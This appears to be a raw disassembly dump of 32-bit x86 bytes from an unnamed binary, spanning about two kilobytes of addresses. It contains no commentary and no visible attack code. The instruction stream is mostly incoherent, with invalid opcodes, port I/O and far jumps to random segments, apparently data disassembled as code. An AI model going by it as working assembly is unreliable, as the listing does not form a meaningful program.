  41dc40:	retf   0xc6c1
  41dc43:	cwde   
  41dc44:	lods   eax,DWORD PTR ds:[esi]
  41dc45:	out    dx,eax
  41dc46:	cmp    al,0x7d
  41dc48:	lods   eax,DWORD PTR ds:[esi]
  41dc49:	retf   0xa671
  41dc4c:	pop    ebp
  41dc4d:	in     al,0x84
  41dc4f:	and    al,0x1c
  41dc51:	sub    DWORD PTR [esi],esi
  41dc53:	mov    edx,0x5583618c
  41dc58:	xor    bh,BYTE PTR [ecx+0x23]
  41dc5b:	rol    BYTE PTR [esi+0x78b9c627],1
  41dc61:	jne    0x41dc66
  41dc63:	outs   dx,DWORD PTR ds:[esi]
  41dc64:	aaa    
  41dc65:	(bad)  
  41dc66:	out    dx,eax
  41dc67:	inc    ecx
  41dc68:	loopne 0x41dc58
  41dc6a:	loope  0x41dca2
  41dc6c:	inc    ebp
  41dc6d:	shr    BYTE PTR [ebx+0x5c],0x1f
  41dc71:	ja     0x41dce6
  41dc73:	xlat   BYTE PTR ds:[ebx]
  41dc74:	jns    0x41dca2
  41dc76:	call   0xad4c:0x91706994
  41dc7d:	jle    0x41dcf1
  41dc7f:	pushf  
  41dc80:	aam    0x32
  41dc82:	jnp    0x41dc3a
  41dc84:	pop    ebx
  41dc85:	or     BYTE PTR [ecx+edi*4+0x12],dh
  41dc89:	sub    eax,0x4779df19
  41dc8e:	cmp    bh,BYTE PTR [esi-0x6e0e7ea9]
  41dc94:	jl     0x41dcb9
  41dc96:	fdivr  QWORD PTR [edx+edx*1]
  41dc99:	in     al,dx
  41dc9a:	mov    al,0xbc
  41dc9c:	jbe    0x41dccf
  41dc9e:	pushf  
  41dc9f:	jge    0x41dc55
  41dca1:	mov    ds:0xfe9e9997,al
  41dca6:	test   BYTE PTR [edi],ch
  41dca8:	inc    esi
  41dca9:	add    cl,dh
  41dcab:	ret    0x2fc7
  41dcae:	add    BYTE PTR [ecx-0x31],dl
  41dcb1:	leave  
  41dcb2:	test   al,0x7f
  41dcb4:	adc    eax,0xa7f49685
  41dcb9:	inc    DWORD PTR [eax-0x7]
  41dcbc:	retf   0x17e1
  41dcbf:	cmc    
  41dcc0:	xor    DWORD PTR [edx+ecx*8],ecx
  41dcc3:	ror    DWORD PTR [edi-0xf0d2c1f],1
  41dcc9:	push   esi
  41dcca:	lods   al,BYTE PTR ds:[esi]
  41dccb:	mov    ebp,0x284fe7d
  41dcd0:	lods   al,BYTE PTR ds:[esi]
  41dcd1:	aaa    
  41dcd2:	jns    0x41dc5d
  41dcd4:	jno    0x41dc79
  41dcd6:	xor    eax,DWORD PTR [esi-0x2]
  41dcd9:	xchg   edi,eax
  41dcda:	cmp    al,0xb7
  41dcdc:	int    0xe4
  41dcde:	push   edx
  41dcdf:	mov    eax,fs
  41dce1:	rol    BYTE PTR [eax],1
  41dce3:	data16 jl 0x41dcf4
  41dce6:	loop   0x41dd26
  41dce8:	sbb    DWORD PTR [ebp-0x64],esi
  41dceb:	sbb    eax,0x90a60499
  41dcf0:	add    eax,0xab6245cf
  41dcf5:	mov    BYTE PTR [ebx+0x47],cl
  41dcf8:	aaa    
  41dcf9:	pop    ds
  41dcfa:	mov    cl,0xe4
  41dcfc:	push   ebp
  41dcfd:	xchg   DWORD PTR [edx-0x2534862b],ebx
  41dd03:	aad    0x39
  41dd05:	or     edi,DWORD PTR [esp+ebx*8-0x6bd2bd]
  41dd0c:	sbb    BYTE PTR ss:[edx],bl
  41dd0f:	or     edx,DWORD PTR [edx]
  41dd11:	push   edi
  41dd12:	xor    DWORD PTR [edi-0x51],eax
  41dd15:	inc    eax
  41dd16:	fild   DWORD PTR [esi-0x2b0cd0db]
  41dd1c:	fisub  DWORD PTR ds:0xcc454270
  41dd22:	sbb    DWORD PTR [eax],0x26642d4d
  41dd28:	sbb    esp,ebx
  41dd2a:	jne    0x41dcf2
  41dd2c:	loopne 0x41dd7f
  41dd2e:	popf   
  41dd2f:	imul   esp,DWORD PTR [esi-0x302b0f50],0xffffffe1
  41dd36:	scas   al,BYTE PTR es:[edi]
  41dd37:	jmp    0x41dd44
  41dd39:	ror    DWORD PTR [ebx-0x7d],0x95
  41dd3d:	popa   
  41dd3e:	rol    DWORD PTR [esi-0x38],cl
  41dd41:	dec    edx
  41dd42:	mov    al,ds:0x7dca3388
  41dd47:	(bad)  
  41dd49:	inc    edx
  41dd4a:	fmulp  st(6),st
  41dd4c:	jecxz  0x41dd34
  41dd4e:	aam    0xdc
  41dd50:	sub    ebp,eax
  41dd52:	out    0xda,eax
  41dd54:	test   al,0xa7
  41dd56:	sbb    BYTE PTR [edi+0x1a54760c],ch
  41dd5c:	jo     0x41ddad
  41dd5e:	push   ebx
  41dd5f:	out    dx,al
  41dd60:	and    BYTE PTR [ebp-0x3d],ah
  41dd63:	push   ebx
  41dd64:	push   ecx
  41dd65:	fild   WORD PTR [edx]
  41dd67:	dec    esi
  41dd68:	mov    ch,0xba
  41dd6a:	adc    edx,esi
  41dd6c:	mov    ch,0xe
  41dd6e:	aad    0xfa
  41dd70:	test   eax,0x46ef7b59
  41dd75:	xchg   ecx,ebx
  41dd77:	add    DWORD PTR [eax-0x41],edi
  41dd7a:	pushf  
  41dd7b:	pop    esi
  41dd7c:	scas   al,BYTE PTR es:[edi]
  41dd7d:	inc    edi
  41dd7e:	jne    0x41ddd0
  41dd80:	loopne 0x41dda0
  41dd82:	scas   eax,DWORD PTR es:[edi]
  41dd83:	je     0x41dd8e
  41dd85:	xchg   DWORD PTR [edx-0xa],esp
  41dd88:	pop    esi
  41dd89:	loopne 0x41dd65
  41dd8b:	imul   ebx,DWORD PTR [ebx-0x26fb7885],0x5c
  41dd92:	mov    bl,0x7f
  41dd94:	fst    QWORD PTR [ebx+0xe]
  41dd97:	jmp    edx
  41dd99:	lds    edi,FWORD PTR [edi+0x3ec17ded]
  41dd9f:	out    0xa8,eax
  41dda1:	mov    ah,0x1e
  41dda3:	(bad)  
  41dda4:	xlat   BYTE PTR ds:[ebx]
  41dda5:	jo     0x41ddc3
  41dda7:	push   edx
  41dda8:	popa   
  41dda9:	pop    esp
  41ddaa:	aaa    
  41ddab:	xor    cl,BYTE PTR [ebx]
  41ddad:	data16 mov al,0x1a
  41ddb0:	mov    ds:0xbf12e607,eax
  41ddb5:	sahf   
  41ddb6:	sbb    eax,esi
  41ddb8:	aas    
  41ddb9:	xor    al,0x6
  41ddbb:	loop   0x41dd64
  41ddbd:	neg    DWORD PTR [esi+0x5ff9b9c9]
  41ddc3:	mov    DWORD PTR [ebx],ecx
  41ddc5:	mov    esi,0x16378c57
  41ddca:	push   0xffffffd6
  41ddcc:	or     BYTE PTR [ebp-0x17],0xc5
  41ddd0:	push   eax
  41ddd1:	push   ebx
  41ddd2:	(bad)  
  41ddd4:	mov    ds:0xd53b8992,eax
  41ddd9:	mov    esp,DWORD PTR [ebx+0x58]
  41dddc:	aas    
  41dddd:	add    al,0xf4
  41dddf:	cli    
  41dde0:	jge    0x41dd95
  41dde2:	push   es
  41dde3:	mov    dh,0xa0
  41dde5:	dec    ebx
  41dde6:	adc    ah,ch
  41dde8:	enter  0x7242,0x3
  41ddec:	adc    edx,DWORD PTR [esi+0x47b49c8a]
  41ddf2:	scas   eax,DWORD PTR es:[edi]
  41ddf3:	mov    esi,0xc9504617
  41ddf8:	or     DWORD PTR cs:[ecx],esi
  41ddfb:	jg     0x41dd91
  41ddfd:	pop    ss
  41ddfe:	cmp    BYTE PTR [edx+0x2543ece3],dh
  41de04:	das    
  41de05:	ds jb  0x41ddf0
  41de08:	cmp    al,0x94
  41de0a:	fs sahf 
  41de0c:	les    ebp,FWORD PTR [ecx+ebp*8+0x702f963a]
  41de13:	add    edx,DWORD PTR [ebx-0x5172f22]
  41de19:	aad    0xd
  41de1b:	out    dx,al
  41de1c:	mov    edi,esi
  41de1e:	repnz xchg ebx,eax
  41de20:	dec    ebp
  41de21:	lea    ecx,[ebx-0x58]
  41de24:	mov    al,ds:0x5985170c
  41de29:	les    ebx,FWORD PTR [eax]
  41de2b:	xlat   BYTE PTR ds:[ebx]
  41de2c:	jae    0x41de5d
  41de2e:	cs lock sbb eax,0x788736b0
  41de35:	push   0x711b133d
  41de3a:	test   DWORD PTR [ebx-0x79],eax
  41de3d:	push   eax
  41de3e:	adc    dl,bh
  41de40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de41:	xchg   ebp,eax
  41de42:	jns    0x41de1b
  41de44:	fstp   DWORD PTR [esi-0x56]
  41de47:	neg    DWORD PTR [eax]
  41de49:	rcr    DWORD PTR [edi+0x29b92b8a],cl
  41de4f:	add    esi,esp
  41de51:	fidiv  WORD PTR [ebx+0x28]
  41de54:	icebp  
  41de55:	(bad)  
  41de56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de57:	in     al,dx
  41de58:	lea    edx,[edi+0x39]
  41de5b:	fisubr WORD PTR [eax+0x3ce6ae32]
  41de61:	dec    ecx
  41de62:	loope  0x41de9c
  41de64:	out    dx,al
  41de65:	or     ch,al
  41de67:	jge    0x41de19
  41de69:	cs jb  0x41de58
  41de6c:	push   0x4c433d50
  41de71:	fnstcw WORD PTR [edx+0x1910a704]
  41de77:	sub    DWORD PTR [eax-0x2d9e7250],ecx
  41de7d:	mul    BYTE PTR [edi-0x53]
  41de80:	jae    0x41de0a
  41de82:	sbb    dl,BYTE PTR [esi-0x17]
  41de85:	out    dx,al
  41de86:	jbe    0x41de9d
  41de88:	loop   0x41deb2
  41de8a:	pop    eax
  41de8b:	jnp    0x41de57
  41de8d:	adc    DWORD PTR [edx-0x4b67e36b],0x9c09d9c
  41de97:	push   ds
  41de98:	jecxz  0x41de51
  41de9a:	in     eax,dx
  41de9b:	mov    ds:0x91bbe578,al
  41dea0:	(bad)  
  41dea1:	xchg   ebp,eax
  41dea2:	cdq    
  41dea3:	push   ecx
  41dea4:	pop    ecx
  41dea5:	and    ch,ch
  41dea7:	mov    cl,BYTE PTR ds:[edi-0x40009893]
  41deae:	cmp    bl,dh
  41deb0:	ret    0x7c78
  41deb3:	sub    cl,bl
  41deb5:	in     al,dx
  41deb6:	push   esi
  41deb7:	push   es
  41deb8:	mov    edi,0x15f2f671
  41debd:	rol    ecx,0x2c
  41dec0:	aam    0xd2
  41dec2:	and    eax,0xb7ee36b2
  41dec7:	idiv   DWORD PTR [edi]
  41dec9:	mov    ah,0x30
  41decb:	loop   0x41dea5
  41decd:	mov    ebx,0xb4ce194e
  41ded2:	rcl    BYTE PTR [esi+0x15d84a08],0xda
  41ded9:	jge    0x41de91
  41dedb:	dec    edx
  41dedc:	mov    ds:0x1b6ef46a,eax
  41dee1:	jb     0x41dee9
  41dee3:	in     al,0x20
  41dee5:	into   
  41dee6:	adc    esi,DWORD PTR [ebx]
  41dee8:	int3   
  41dee9:	popa   
  41deea:	and    al,0x67
  41deec:	jecxz  0x41def4
  41deee:	and    cl,dl
  41def0:	sti    
  41def1:	mov    ds:0xab72fa85,eax
  41def6:	push   ds
  41def7:	mov    eax,0xb6c75bf2
  41defc:	lea    edx,[edx]
  41defe:	xchg   esi,eax
  41deff:	in     eax,0xc
  41df01:	sti    
  41df02:	jno    0x41def5
  41df04:	lock je 0x41dece
  41df07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df08:	mov    ch,0xce
  41df0a:	mov    cs,WORD PTR ds:0xcd51af68
  41df10:	fimul  WORD PTR [ecx]
  41df12:	les    edx,FWORD PTR ds:[eax]
  41df15:	mov    ebx,0xee0a7f17
  41df1a:	xchg   edx,eax
  41df1b:	aad    0x12
  41df1d:	xchg   edx,eax
  41df1e:	shr    BYTE PTR [ecx-0x2a],cl
  41df21:	push   esp
  41df22:	xor    DWORD PTR [eax-0x6906fc1f],0x1f4d320f
  41df2c:	push   ebp
  41df2d:	gs push ss
  41df2f:	push   ecx
  41df30:	aam    0xc3
  41df32:	sub    ah,BYTE PTR [ecx-0x7ad2c113]
	...
  41df40:	add    BYTE PTR ds:0x7f7d7f79,dl
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	and    al,0xc
  41df4f:	jmp    0x19ce3b5
  41df54:	add    BYTE PTR [edi-0xafffffd],ch
  41df5a:	sbb    eax,0x63e54b43
  41df5f:	sbb    eax,0x38bccaf2
  41df64:	fidivr DWORD PTR [ebx]
  41df66:	fcmovnu st,st(0)
  41df68:	jp     0x41df9a
  41df6a:	ds jp  0x41df93
  41df6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df6e:	sub    BYTE PTR [ecx+0x30e4f2e3],dh
  41df74:	xor    ecx,edi
  41df76:	mov    WORD PTR [ebx],ds
  41df78:	gs cmp dl,dh
  41df7b:	hlt    
  41df7c:	mov    ch,BYTE PTR [edi-0x52]
  41df7f:	xor    eax,0x7cd37eab
  41df84:	in     eax,0xaf
  41df86:	or     eax,0xdc8bd991
  41df8b:	cli    
  41df8c:	xchg   esi,eax
  41df8d:	in     al,dx
  41df8e:	jne    0x41df52
  41df90:	jo     0x41dfd9
  41df92:	inc    edx
  41df93:	xchg   DWORD PTR [esi+0x6],esp
  41df96:	push   edi
  41df97:	sbb    al,0x60
  41df99:	or     eax,0x7aeff20
  41df9e:	cmp    bl,BYTE PTR [ebx]
  41dfa0:	into   
  41dfa1:	sti    
  41dfa2:	shr    esp,cl
  41dfa4:	(bad)  [ecx]
  41dfa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfa7:	xor    DWORD PTR [ecx-0x15825558],0xffffff9d
  41dfae:	int    0x7a
  41dfb0:	mov    cl,0x7c
  41dfb2:	js     0x41dfc5
  41dfb4:	shufps xmm1,XMMWORD PTR [esi-0x41026ff7],0x19
  41dfbc:	ret    0xc9fa
  41dfbf:	push   edi
  41dfc0:	adc    esi,DWORD PTR [ebx]
  41dfc2:	xor    eax,0x224fd906
  41dfc7:	mov    al,BYTE PTR [edi+eiz*2-0x53a94f96]
  41dfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfcf:	mov    dh,0xda
  41dfd1:	adc    al,0x70
  41dfd3:	cmp    ebp,eax
  41dfd5:	push   ebx
  41dfd6:	xor    al,0x84
  41dfd8:	jb     0x41dfa1
  41dfda:	cmc    
  41dfdb:	cmc    
  41dfdc:	aaa    
  41dfdd:	jecxz  0x41df7e
  41dfdf:	pop    edx
  41dfe0:	and    BYTE PTR [esi],dl
  41dfe2:	pop    esp
  41dfe3:	cmp    ch,dl
  41dfe5:	push   ecx
  41dfe6:	fisub  WORD PTR [ebp-0x6d7c8a1b]
  41dfec:	fsub   QWORD PTR [eax]
  41dfee:	add    ebp,esp
  41dff0:	adc    al,0x9d
  41dff2:	push   edi
  41dff3:	and    BYTE PTR [esi],bh
  41dff5:	cld    
  41dff6:	mov    al,ds:0x8150c5c2
  41dffb:	mov    es,WORD PTR [ecx+0x3c45bc11]
  41e001:	test   BYTE PTR [esi-0x2d],ch
  41e004:	clc    
  41e005:	imul   ebp,DWORD PTR [ecx+0x45],0xffffffcc
  41e009:	mov    esi,0x98e11ec4
  41e00e:	cld    
  41e00f:	jge    0x41e06a
  41e011:	fnsave [eax]
  41e013:	repnz popf 
  41e015:	arpl   WORD PTR [eax+edx*4+0x7f19091b],sp
  41e01c:	retf   0xfbcf
  41e01f:	lods   eax,DWORD PTR ds:[esi]
  41e020:	mov    ch,0x5f
  41e022:	jo     0x41e041
  41e024:	dec    esi
  41e025:	push   0x734c5f9c
  41e02a:	fstp   QWORD PTR [ebx+esi*2-0x22]
  41e02e:	je     0x41dfbe
  41e030:	pop    ss
  41e031:	ret    0x60f7
  41e034:	push   es
  41e035:	mov    al,ds:0xacfc7482
  41e03a:	or     eax,0xdd0a4aa8
  41e03f:	lods   eax,DWORD PTR ds:[esi]
  41e040:	mov    edx,0x249684d2
  41e045:	rcr    ch,1
  41e047:	sbb    al,0x59
  41e049:	mov    eax,DWORD PTR [edx+0xbea0369]
  41e04f:	add    al,BYTE PTR [ecx+0x20808125]
  41e055:	add    al,0x17
  41e057:	out    0x31,al
  41e059:	fs inc edi
  41e05b:	(bad)  
  41e05c:	xchg   esi,eax
  41e05d:	loopne 0x41e0be
  41e05f:	push   edi
  41e060:	nop
  41e061:	and    al,0x21
  41e063:	mov    ebp,0xb2b0ee5a
  41e068:	test   eax,0x99a51643
  41e06d:	sbb    eax,0x2d7967d2
  41e072:	fsubrp st(4),st
  41e074:	rcl    DWORD PTR [edi-0x14],1
  41e077:	shl    DWORD PTR [esi-0x2b7e2bdf],cl
  41e07d:	dec    esp
  41e07e:	jle    0x41e0a9
  41e080:	xchg   edx,eax
  41e081:	(bad)  
  41e082:	call   0x633eb023
  41e087:	dec    edx
  41e088:	aad    0xe1
  41e08a:	sbb    al,0x6
  41e08c:	ins    BYTE PTR es:[edi],dx
  41e08d:	push   0xffffffcb
  41e08f:	mov    bl,0x4d
  41e091:	pop    ecx
  41e092:	gs dec ecx
  41e094:	xchg   esp,eax
  41e095:	adc    ecx,DWORD PTR [bx-0xc86]
  41e09a:	sub    DWORD PTR [ecx],edx
  41e09c:	daa    
  41e09d:	xchg   esp,eax
  41e09e:	adc    eax,0x70d3f64d
  41e0a3:	pop    es
  41e0a4:	(bad)  
  41e0a5:	daa    
  41e0a6:	jmp    0x1e94:0x1ccf348c
  41e0ad:	push   ebx
  41e0ae:	psubusb mm1,QWORD PTR [esi-0x4f]
  41e0b2:	(bad)  
  41e0b3:	mov    ecx,esp
  41e0b5:	mov    bh,0xa6
  41e0b7:	retf   0x73e8
  41e0ba:	or     al,0x8a
  41e0bc:	sbb    ebp,DWORD PTR [ecx-0x6ef709dc]
  41e0c2:	(bad)  
  41e0c3:	cmp    ebx,DWORD PTR gs:[eax]
  41e0c6:	rcl    DWORD PTR [ebx],0x26
  41e0c9:	pop    ss
  41e0ca:	mov    ah,BYTE PTR [edx]
  41e0cc:	iret   
  41e0cd:	mov    ?,WORD PTR [eax]
  41e0cf:	pushf  
  41e0d0:	and    ah,ch
  41e0d2:	retf   
  41e0d3:	xor    BYTE PTR [edi+0x7a06681b],cl
  41e0d9:	inc    ebp
  41e0da:	pop    eax
  41e0db:	sahf   
  41e0dc:	addr16 icebp 
  41e0de:	and    edx,ecx
  41e0e0:	cmp    bl,BYTE PTR [eax+0x7b]
  41e0e3:	ret    
  41e0e4:	call   0x759d0741
  41e0e9:	in     ax,dx
  41e0eb:	loope  0x41e117
  41e0ed:	dec    eax
  41e0ee:	pop    ss
  41e0ef:	loope  0x41e141
  41e0f1:	jle    0x41e09c
  41e0f3:	jne    0x41e130
  41e0f5:	fdiv   QWORD PTR [edi]
  41e0f7:	add    dh,BYTE PTR [ecx+0x52c5b5aa]
  41e0fd:	les    edi,FWORD PTR [ecx+0x9]
  41e100:	and    eax,0x4e377cdd
  41e105:	jle    0x41e147
  41e107:	sar    DWORD PTR [edi+eax*8-0x4f45bb94],0x83
  41e10f:	int    0x8
  41e111:	xor    bl,BYTE PTR [ebp+0x651d3a7f]
  41e117:	iret   
  41e118:	xchg   ecx,eax
  41e119:	dec    esi
  41e11a:	into   
  41e11b:	adc    DWORD PTR [eax],eax
  41e11d:	sub    DWORD PTR [esi+0xe562a92],0x29
  41e124:	fidivr WORD PTR [edi+0x2b163e1a]
  41e12a:	push   ds
  41e12b:	add    BYTE PTR [ebx+0x1ab3e49f],0xdc
  41e132:	pop    ds
  41e133:	jl     0x41e0f9
  41e135:	pop    ebx
  41e136:	inc    esi
  41e137:	mul    BYTE PTR [edx+0x334fdf52]
  41e13d:	xchg   ebx,eax
  41e13e:	jp     0x41e118
  41e140:	sbb    bl,BYTE PTR [ebp-0x50]
  41e143:	scas   eax,DWORD PTR es:[edi]
  41e144:	in     al,dx
  41e145:	cli    
  41e146:	adc    BYTE PTR [esi+0x4a],dh
  41e149:	cmc    
  41e14a:	jmp    0x41ac:0x5db16bbe
  41e151:	popa   
  41e152:	xor    edi,esp
  41e154:	pushf  
  41e155:	sbb    BYTE PTR [edi+0x4c],bl
  41e158:	pop    edx
  41e159:	xchg   esp,eax
  41e15a:	sar    esp,1
  41e15c:	fdivp  st(3),st
  41e15e:	push   eax
  41e15f:	scas   eax,DWORD PTR es:[edi]
  41e160:	inc    esp
  41e161:	pop    ebx
  41e162:	ins    DWORD PTR es:[edi],dx
  41e163:	int    0x91
  41e165:	icebp  
  41e166:	xor    esi,DWORD PTR [ebx]
  41e168:	repz jle 0x41e1b3
  41e16b:	push   edi
  41e16c:	dec    edi
  41e16d:	add    DWORD PTR [esi+0x48],edi
  41e170:	xor    BYTE PTR ds:0x87780cbc,bl
  41e176:	add    al,0x9d
  41e178:	inc    ebp
  41e179:	jmp    0x41e105
  41e17b:	cmp    esp,DWORD PTR es:[ebx+ebx*2-0x3345481c]
  41e183:	out    dx,eax
  41e184:	gs add al,0xb3
  41e187:	fadd   QWORD PTR [edi-0x8c2f3af]
  41e18d:	dec    eax
  41e18e:	fs push ecx
  41e190:	jno    0x41e16a
  41e192:	retf   0x3679
  41e195:	mov    ebx,0x4ae016e
  41e19a:	mov    al,ds:0x36ae98cf
  41e19f:	add    dl,BYTE PTR [eax]
  41e1a1:	inc    edi
  41e1a2:	scas   eax,DWORD PTR es:[edi]
  41e1a3:	jbe    0x41e148
  41e1a5:	xchg   ecx,eax
  41e1a6:	in     eax,dx
  41e1a7:	sahf   
  41e1a8:	xor    al,0x30
  41e1aa:	inc    ebp
  41e1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ac:	outs   dx,BYTE PTR ds:[esi]
  41e1ad:	adc    al,0xee
  41e1af:	aam    0x38
  41e1b1:	ret    
  41e1b2:	fstp   QWORD PTR [ebp-0x66]
  41e1b5:	stos   DWORD PTR es:[edi],eax
  41e1b6:	mov    dh,0x59
  41e1b8:	test   al,0x8d
  41e1ba:	lahf   
  41e1bb:	pop    esp
  41e1bc:	enter  0xbca2,0x18
  41e1c0:	dec    ecx
  41e1c1:	or     ch,BYTE PTR [ebp-0x55]
  41e1c4:	sub    dh,BYTE PTR [ebp-0x4fe9ca3e]
  41e1ca:	push   ds
  41e1cb:	out    dx,al
  41e1cc:	out    dx,al
  41e1cd:	fisubr DWORD PTR [edx+0xf]
  41e1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d1:	jecxz  0x41e181
  41e1d3:	(bad)  [ebp+0x6f]
  41e1d6:	mov    dh,0x4d
  41e1d8:	cmp    esp,ebp
  41e1da:	sub    DWORD PTR [ebp-0x77f41b85],ecx
  41e1e0:	adc    al,0xa0
  41e1e2:	mov    WORD PTR [ecx+0x5bd96a9f],es
  41e1e8:	and    bl,dl
  41e1ea:	loopne 0x41e19a
  41e1ec:	inc    edx
  41e1ed:	fdiv   st,st(4)
  41e1ef:	push   ebx
  41e1f0:	aad    0x2
  41e1f2:	cmp    eax,0xf53476dd
  41e1f7:	xor    BYTE PTR [esi-0x58de3dc9],al
  41e1fd:	jo     0x41e1de
  41e1ff:	fisubr WORD PTR [edi+ebx*2-0x20]
  41e203:	dec    esp
  41e204:	sub    eax,edx
  41e206:	scas   eax,DWORD PTR es:[edi]
  41e207:	loop   0x41e212
  41e209:	inc    esp
  41e20a:	test   eax,0x4d47319c
  41e20f:	adc    al,0xa1
  41e211:	(bad)  
  41e212:	lea    esp,[ebp-0x29bd6ece]
  41e218:	dec    edx
  41e219:	mov    dl,0xd0
  41e21b:	imul   edi,DWORD PTR [ebx-0x2db115e5],0x7bbb177b
  41e225:	inc    ebp
  41e226:	test   DWORD PTR [ebp+0x39],edx
  41e229:	pop    eax
  41e22a:	jnp    0x41e25d
  41e22c:	dec    esi
  41e22d:	dec    edi
  41e22e:	sub    al,0x87
  41e230:	and    ch,ah
  41e232:	lods   eax,DWORD PTR ds:[esi]
  41e233:	ja     0x41e24f
  41e235:	imul   ebp,eax,0x47a3f9cd
  41e23b:	pop    ebx
  41e23c:	jl     0x41e1ea
  41e23e:	xor    ch,0x70
  41e241:	mov    edx,0xe1612728
  41e246:	add    eax,esi
  41e248:	xor    eax,0x99c58a5e
  41e24d:	jle    0x41e244
  41e24f:	or     DWORD PTR [esi-0x6d5473cb],ebx
  41e255:	jo     0x41e2c3
  41e257:	(bad)  
  41e258:	es sti 
  41e25a:	sub    eax,0xe457ef75
  41e25f:	dec    ecx
  41e260:	pop    edi
  41e261:	jnp    0x41e242
  41e263:	in     eax,dx
  41e264:	lock out dx,eax
  41e266:	or     dl,dl
  41e268:	push   ebx
  41e269:	mov    ds:0x91a77c9f,al
  41e26e:	jae    0x41e273
  41e270:	clc    
  41e271:	out    dx,al
  41e272:	in     al,0x9a
  41e274:	push   es
  41e275:	cmc    
  41e276:	out    dx,al
  41e277:	xchg   ecx,eax
  41e278:	les    edx,FWORD PTR [ebx-0x278e691b]
  41e27e:	fcmovnu st,st(5)
  41e280:	and    DWORD PTR [esi],eax
  41e282:	(bad)  
  41e283:	in     al,0x40
  41e285:	call   DWORD PTR [edi+0x7b0ec006]
  41e28b:	cmp    DWORD PTR [ebx-0x63],esi
  41e28e:	xor    ah,BYTE PTR [edx+0x4c]
  41e291:	sbb    al,0xa9
  41e293:	cmp    BYTE PTR [edi-0xf0bcea0],bh
  41e299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e29a:	inc    ebp
  41e29b:	lock jge 0x41e257
  41e29e:	dec    edx
  41e29f:	fs or  eax,0xd2c18790
  41e2a5:	out    0xd,al
  41e2a7:	into   
  41e2a8:	rol    BYTE PTR ds:0x58c6ea69,0x7e
  41e2af:	xchg   DWORD PTR [ecx-0x705e2770],esp
  41e2b5:	pop    esp
  41e2b6:	stos   BYTE PTR es:[edi],al
  41e2b7:	sti    
  41e2b8:	pushf  
  41e2b9:	rcl    DWORD PTR [eax+0x371748ea],cl
  41e2bf:	mov    al,0x2a
  41e2c1:	adc    eax,0x43b30122
  41e2c6:	ret    0x5585
  41e2c9:	xor    esp,DWORD PTR [ebp-0x241ef56f]
  41e2cf:	dec    ebx
  41e2d0:	rcl    dh,0x7b
  41e2d3:	push   eax
  41e2d4:	sar    dl,cl
  41e2d6:	mov    gs,ebp
  41e2d8:	and    eax,0xb21c72ca
  41e2dd:	push   es
  41e2de:	dec    esp
  41e2df:	cli    
  41e2e0:	retf   
  41e2e1:	dec    ebx
  41e2e2:	sub    BYTE PTR ds:0x14acca08,ch
  41e2e8:	jno    0x41e272
  41e2ea:	dec    edx
  41e2eb:	dec    edi
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	test   BYTE PTR ds:0x9480f882,cl
  41e2f3:	xchg   edx,eax
  41e2f4:	xchg   ebx,eax
  41e2f5:	pop    es
  41e2f6:	jl     0x41e2cb
  41e2f8:	shl    BYTE PTR [eax],1
  41e2fa:	dec    eax
  41e2fb:	outs   dx,BYTE PTR ds:[esi]
  41e2fc:	outs   dx,BYTE PTR ds:[esi]
  41e2fd:	pop    eax
  41e2fe:	sub    DWORD PTR [ebx+edx*2+0x71],edi
  41e302:	(bad)  
  41e303:	jmp    0x41e322
  41e305:	int    0xc6
  41e307:	sbb    eax,DWORD PTR [eax]
	...
  41e311:	outs   dx,BYTE PTR ds:[esi]
  41e312:	idiv   DWORD PTR [ebx-0x1924497]
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	loopne 0x41e367
  41e31f:	out    0x3d,al
  41e321:	mov    bl,0x5e
  41e323:	add    DWORD PTR [eax],eax
  41e325:	scas   eax,DWORD PTR es:[edi]
  41e326:	add    eax,DWORD PTR [eax]
  41e328:	add    BYTE PTR [eax+0x4bdec750],dh
  41e32e:	inc    ebp
  41e32f:	in     eax,dx
  41e330:	ins    BYTE PTR es:[edi],dx
  41e331:	mov    esp,0xd319a6b0
  41e336:	loope  0x41e316
  41e338:	sbb    DWORD PTR [edi-0x5f8d02ad],esi
  41e33e:	cdq    
  41e33f:	sbb    al,0xb6
  41e341:	mov    dl,0x5c
  41e343:	mov    ebp,0xb73815e0
  41e348:	pop    ebx
  41e349:	add    al,0x4e
  41e34b:	jnp    0x41e2e5
  41e34d:	and    ch,0x93
  41e350:	sbb    edi,DWORD PTR [edi+0x4a]
  41e353:	pop    edi
  41e354:	std    
  41e355:	pushf  
  41e356:	stos   DWORD PTR es:[edi],eax
  41e357:	iret   
  41e358:	xchg   esi,eax
  41e359:	pop    esp
  41e35a:	repnz popf 
  41e35c:	jmp    0x400c9907
  41e361:	mov    dh,0x23
  41e363:	les    ebp,FWORD PTR [ebx-0x43]
  41e366:	xlat   BYTE PTR ds:[ebx]
  41e367:	add    eax,0x78
  41e36a:	mov    BYTE PTR [esi-0x3e],dh
  41e36d:	je     0x41e3d7
  41e36f:	pop    edx
  41e370:	push   esi
  41e371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e372:	pop    ecx
  41e373:	outs   dx,BYTE PTR ds:[esi]
  41e374:	fmulp  st(2),st
  41e376:	mov    eax,0xc65b00c8
  41e37b:	jae    0x41e310
  41e37d:	sub    dl,BYTE PTR [ebx+0x43]
  41e380:	shl    BYTE PTR [ebp-0x534c8240],1
  41e386:	pop    ds
  41e387:	icebp  
  41e388:	(bad)  
  41e389:	xlat   BYTE PTR ds:[ebx]
  41e38a:	add    eax,0xc8aea5f9
  41e38f:	clc    
  41e390:	ret    
  41e391:	pop    eax
  41e392:	pop    edx
  41e393:	cld    
  41e394:	sbb    BYTE PTR [eax+edx*8+0x3fafaad7],al
  41e39b:	cmc    
  41e39c:	add    eax,0x573b2805
  41e3a1:	fisub  DWORD PTR [edx-0x59]
  41e3a4:	pop    ecx
  41e3a5:	adc    DWORD PTR [edi],ebx
